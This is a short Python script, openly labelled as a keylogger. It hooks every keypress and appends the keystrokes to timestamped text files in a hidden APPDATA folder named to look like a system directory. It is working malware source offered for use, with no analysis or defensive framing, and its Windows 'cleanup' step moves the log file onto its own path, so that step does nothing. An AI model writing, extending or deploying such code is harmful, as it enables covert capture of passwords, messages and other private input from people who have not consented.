# A keylogger that stores the data in a txt format

import os
import platform
import shutil
from datetime import datetime
import keyboard

def create_log_folder():
    appdata_path = os.getenv('APPDATA')
    folder_path = os.path.join(appdata_path, "SystemFilesx128")
    os.makedirs(folder_path, exist_ok=True)
    return folder_path

def get_log_file_path(folder_path):
    current_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    log_file_name = f"keylog_{current_time}.txt"
    return os.path.join(folder_path, log_file_name)

def start_keylogger(log_file):
    keyboard.on_press(lambda event: on_press(event, log_file))
    keyboard.wait()  # Wait indefinitely

def on_press(event, log_file):
    key = event.name
    with open(log_file, "a") as f:
        if key in ["space", "backspace", "shift", "esc"]:
            f.write("\n" + key + "\n")
        else:
            f.write(key)

def main():
    print("Keylogger started. Press Ctrl+C to stop.")
    folder_path = create_log_folder()
    log_file = get_log_file_path(folder_path)
    with open(log_file, "w") as f:
        pass  # Create an empty log file
    start_keylogger(log_file)
    
    print("Keylogger stopped. Log file location:", log_file)

    # Check if running on Windows and perform necessary cleanup
    if platform.system() == "Windows":
        # Move the log file to the folder on program exit
        final_log_path = os.path.join(folder_path, os.path.basename(log_file))
        shutil.move(log_file, final_log_path)

if __name__ == "__main__":
    main()
